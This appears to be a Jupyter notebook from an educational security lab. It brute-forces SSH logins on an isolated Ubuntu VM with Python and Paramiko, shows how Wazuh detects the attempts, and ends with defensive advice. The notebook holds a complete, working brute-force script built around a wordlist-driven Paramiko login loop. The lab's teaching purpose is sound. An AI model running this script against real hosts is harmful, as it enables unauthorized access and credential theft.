# SSH Brute Force Attack — Ethical Hacking Lab

**Environment:** Controlled lab — Hyper-V isolated network  
**Attacker:** Kali Linux (172.22.225.120)  
**Victim:** Ubuntu (172.22.229.213)  
**Tool:** Python + Paramiko  

> This notebook is for educational purposes only. All attacks run inside an isolated virtual network.

## Step 1 — Import Libraries

In [ ]:
import paramiko
import sys
import time
import datetime
import socket

print("[+] Libraries loaded successfully")
print(f"[+] Paramiko version: {paramiko.__version__}")

## Step 2 — Cryptography Background

Before launching the attack, we demonstrate **why brute force works** against weak password hashing.  
The faster an algorithm hashes, the more passwords an attacker can try per second.

In [ ]:
import sys
sys.path.append('../shared')

from crypto_demo import run_demo
run_demo("admin123")

## Step 3 — Attack Configuration

Define the target machine and attack parameters.

In [ ]:
# Target configuration
TARGET_IP   = "172.22.229.213"   # Ubuntu victim VM
TARGET_PORT = 22                  # SSH port
USERNAME    = "yaseen"            # Target username
WORDLIST    = "../attacker/wordlists/common_passwords.txt"
TIMEOUT     = 5                   # Seconds per attempt

print("[*] Attack Configuration")
print(f"    Target   : {TARGET_IP}:{TARGET_PORT}")
print(f"    Username : {USERNAME}")
print(f"    Wordlist : {WORDLIST}")
print(f"    Timeout  : {TIMEOUT}s per attempt")

## Step 4 — Verify Target is Reachable

In [ ]:
def check_target(ip, port, timeout=3):
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.close()
        print(f"[+] Target {ip}:{port} is reachable — SSH port is open")
        return True
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        return False

check_target(TARGET_IP, TARGET_PORT)

## Step 5 — Load Wordlist

In [ ]:
def load_wordlist(path):
    with open(path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(passwords)} passwords from wordlist")
    return passwords

passwords = load_wordlist(WORDLIST)
print(f"[*] First 5 passwords: {passwords[:5]}")
print(f"[*] Last  5 passwords: {passwords[-5:]}")

## Step 6 — Brute Force Function

The core attack function. It tries each password from the wordlist via SSH using **Paramiko**.  
Each failed attempt generates an entry in `/var/log/auth.log` on the victim — which **Wazuh detects**.

In [ ]:
def try_ssh(ip, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=ip,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


def brute_force(ip, port, username, passwords, timeout=5):
    print("=" * 55)
    print("  SSH BRUTE FORCE ATTACK STARTED")
    print("=" * 55)
    print(f"  Target   : {ip}:{port}")
    print(f"  Username : {username}")
    print(f"  Passwords: {len(passwords)}")
    print(f"  Started  : {datetime.datetime.now().strftime('%H:%M:%S')}")
    print("=" * 55)

    attack_log = []

    for i, password in enumerate(passwords, 1):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{i:03d}] {timestamp} Trying: {password:<20}", end=" ")

        success = try_ssh(ip, port, username, password, timeout)

        if success:
            print("SUCCESS")
            attack_log.append({"attempt": i, "password": password, "result": "SUCCESS", "time": timestamp})
            print()
            print("=" * 55)
            print(f"  [+] PASSWORD FOUND!")
            print(f"  [+] Username : {username}")
            print(f"  [+] Password : {password}")
            print(f"  [+] Target   : {ip}:{port}")
            print("=" * 55)
            return password, attack_log
        else:
            print("FAILED")
            attack_log.append({"attempt": i, "password": password, "result": "FAILED", "time": timestamp})

    print()
    print("[-] Password not found in wordlist.")
    return None, attack_log


print("[+] Brute force function ready")

## Step 7 — Launch the Attack

Run the brute force. Watch the **Wazuh dashboard** on the victim side — alerts will appear in real time.

In [ ]:
found_password, log = brute_force(
    ip=TARGET_IP,
    port=TARGET_PORT,
    username=USERNAME,
    passwords=passwords,
    timeout=TIMEOUT
)

## Step 8 — Attack Summary

In [ ]:
total      = len(log)
failed     = sum(1 for e in log if e["result"] == "FAILED")
successful = sum(1 for e in log if e["result"] == "SUCCESS")

print("=" * 55)
print("  ATTACK SUMMARY")
print("=" * 55)
print(f"  Total attempts  : {total}")
print(f"  Failed attempts : {failed}")
print(f"  Successful      : {successful}")

if found_password:
    print(f"  Cracked password: {found_password}")
    print()
    print("  What Wazuh detected on the victim side:")
    print(f"  - {failed} authentication failure alerts")
    print(f"  - 1 successful login after failures (suspicious)")
    print(f"  - MITRE ATT&CK: T1110 - Brute Force")
print("=" * 55)

## Conclusion

This simulation demonstrated:

1. **How SSH brute force works** — trying passwords systematically until one succeeds
2. **Why weak passwords are dangerous** — `123123` was cracked from a small wordlist
3. **How IDS detection works** — every failed SSH attempt was logged and alerted by Wazuh
4. **The cryptography link** — faster hashing algorithms make brute force easier (see Step 2)

**Defense recommendations:**
- Use strong, unique passwords (not in common wordlists)
- Disable password authentication — use SSH keys instead
- Use fail2ban or Wazuh Active Response to auto-block attackers
- Monitor auth logs continuously with an IDS